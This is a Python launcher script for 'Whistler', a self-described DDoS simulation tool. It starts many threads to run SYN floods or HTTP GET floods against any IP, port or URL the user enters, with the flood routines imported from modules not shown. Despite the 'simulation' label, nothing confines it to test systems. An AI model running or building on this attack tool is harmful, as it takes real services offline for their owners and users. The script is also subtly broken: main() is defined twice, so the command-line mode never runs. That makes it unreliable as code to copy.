import threading
import time
import os
import socket
from colorama import Fore, Style, init

from cli.arguments import get_default_log_path, parse_args
from core.syn_flood import syn_flood
from core.http_flood import http_get_flood
from utils.banner import display_banner
from utils.signal_handler import setup_signal_handler
from utils.logger import setup_logger

init(autoreset=True)

all_threads = []
stop_event = threading.Event()
lock = threading.Lock()
request_stats = {'count': 0}
thread_stats = {'ended': 0}

def start_threads(count, target, port_or_url, duration, attack_type, logger=None):
    for i in range(count):
        if attack_type == "syn":
            t = threading.Thread(target=syn_flood, args=(target, port_or_url, duration, stop_event, lock, thread_stats, logger))
        elif attack_type == "http":
            t = threading.Thread(target=http_get_flood, args=(port_or_url, duration, stop_event, lock, request_stats, thread_stats, logger))
        else:
            continue
        t.name = f"{attack_type}_thread_{i+1}"
        t.start()
        all_threads.append(t)
        print(Fore.MAGENTA + f"[+] Thread started: {t.name} | Active Threads: {threading.active_count()}")
        if logger:
            logger.info(f"[+] Thread started: {t.name} | Active Threads: {threading.active_count()}")

def main():
    print("\nStarting Whistler v0.3 - DDoS Simulation CLI Tool\n")
    args = parse_args()

    if args.log:
        if isinstance(args.log, str):
            log_path = args.log
        else:
            log_path = get_default_log_path()
            
        logger = setup_logger(log_path)
        logger.info("Logging started")
        print(Fore.GREEN + f"[✓] Logs will be saved to: {log_path}")
    else:
        logger = None

    if args.attack_type and args.duration and args.threads and \
   ((args.attack_type == "syn" and args.ip and args.port) or \
    (args.attack_type == "http" and args.url)):

        setup_signal_handler(stop_event, all_threads)
        display_banner()

        if logger:
            logger.info(f"Whistler started at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            logger.info(f"Attack Type: {args.attack_type}")
            logger.info(f"Duration: {args.duration} seconds")
            logger.info(f"Threads: {args.threads}")
            if args.attack_type == 'syn':
                logger.info(f"Target IP: {args.ip}")
                logger.info(f"Target Port: {args.port}")
            elif args.attack_type == 'http':
                logger.info(f"Target URL: {args.url}")


        if args.attack_type == "syn":
            if not args.ip or not args.port:
                print(Fore.RED + "[!] IP and Port are required for SYN flood.")
                return
            start_threads(args.threads, args.ip, args.port, args.duration, "syn", logger)

        elif args.attack_type == "http":
            if not args.url:
                print(Fore.RED + "[!] URL is required for HTTP GET flood.")
                return
            start_threads(args.threads, None, args.url, args.duration, "http", logger)

        print(Fore.YELLOW + f"\n[*] Attack running for {args.duration} seconds... Press Ctrl+C to stop early.")
        time.sleep(args.duration)
        stop_event.set()

        for t in all_threads:
            t.join()

        # Summary
        print(Fore.CYAN + "\n\n=========== Summary ===========")
        print(Fore.YELLOW + f"Duration        : {args.duration} seconds")
        print(Fore.YELLOW + f"Threads         : {args.threads}")
        print(Fore.YELLOW + f"Threads Ended   : {thread_stats['ended']}")
        if args.attack_type == "http":
            print(Fore.YELLOW + f"HTTP Requests   : {request_stats['count']}")
        else:
            print(Fore.YELLOW + f"SYN Packets Est.: ~{thread_stats['ended'] * 1000}")
        print(Fore.CYAN + "==============================")
    
        if logger:
            logger.info("=========== Attack Summary ===========")
            logger.info(f"Duration: {args.duration}")
            logger.info(f"Threads Used: {args.threads}")
            logger.info(f"Threads Ended: {thread_stats['ended']}")
            if args.attack_type == "http":
                logger.info(f"Total HTTP Requests: {request_stats['count']}")
            else:
                logger.info(f"Estimated SYN Packets: ~{thread_stats['ended'] * 1000}")
            logger.info("=========== End of Log ===========")
        return
    return
    # If no command line arguments, use interactive mode
def main():
    logger = None
    display_banner()
    setup_signal_handler(stop_event, all_threads)
    
    log_path = get_default_log_path()
    logger = setup_logger(log_path)
    logger.info("Whistler started")
    print(Fore.GREEN + f"[✓] Logs will be saved to: {log_path}")
    
    print(Fore.MAGENTA + "[1] SYN Flood (Local Network)")
    print(Fore.MAGENTA + "[2] HTTP GET Flood (Website)")

    choice = input(Fore.WHITE + Style.BRIGHT + "\nSelect attack type: ").strip()
    try:
        duration = int(input("Attack Duration (in seconds): "))
        thread_count = int(input("Number of Threads: "))
    except ValueError:
        print(Fore.RED + "[!] Invalid input.")
        return

    if duration <= 0 or thread_count <= 0:
        print(Fore.RED + "[!] Duration and thread count must be positive integers.")
        return

    if choice == "1":
        target_ip = input("Target IP: ").strip()
        try:
            socket.inet_aton(target_ip)
            target_port = int(input("Target Port: "))
        except:
            print(Fore.RED + "[!] Invalid IP or Port.")
            return
        start_threads(thread_count, target_ip, target_port, duration, "syn", logger)

    elif choice == "2":
        target_url = input("Target URL (http:// or https://): ").strip()
        if not target_url.startswith(("http://", "https://")):
            print(Fore.RED + "[!] URL must start with http:// or https://")
            return
        start_threads(thread_count, None, target_url, duration, "http", logger)

    else:
        print(Fore.RED + "[!] Invalid option.")
        return

    print(Fore.YELLOW + f"\n[*] Attack running for {duration} seconds... Press Ctrl+C to stop early.")
    time.sleep(duration)
    stop_event.set()

    for t in all_threads:
        t.join()

    print(Fore.CYAN + "\n\n=========== Summary ===========")
    print(Fore.YELLOW + f"Duration        : {duration} seconds")
    print(Fore.YELLOW + f"Threads         : {thread_count}")
    print(Fore.YELLOW + f"Threads Ended   : {thread_stats['ended']}")
    if choice == "2":
        print(Fore.YELLOW + f"HTTP Requests   : {request_stats['count']}")
    else:
        print(Fore.YELLOW + f"SYN Packets Est.: ~{thread_stats['ended'] * 1000}")
    print(Fore.CYAN + "==============================")
    
    if logger:
        logger.info("=========== Attack Summary ===========")
        logger.info(f"Duration: {duration}")
        logger.info(f"Threads Used: {thread_count}")
        logger.info(f"Threads Ended: {thread_stats['ended']}")
        if choice == "2":
            logger.info(f"Total HTTP Requests: {request_stats['count']}")
        else:
            logger.info(f"Estimated SYN Packets: ~{thread_stats['ended'] * 1000}")
        logger.info("=========== End of Log ===========")

if __name__ == "__main__":
    main()
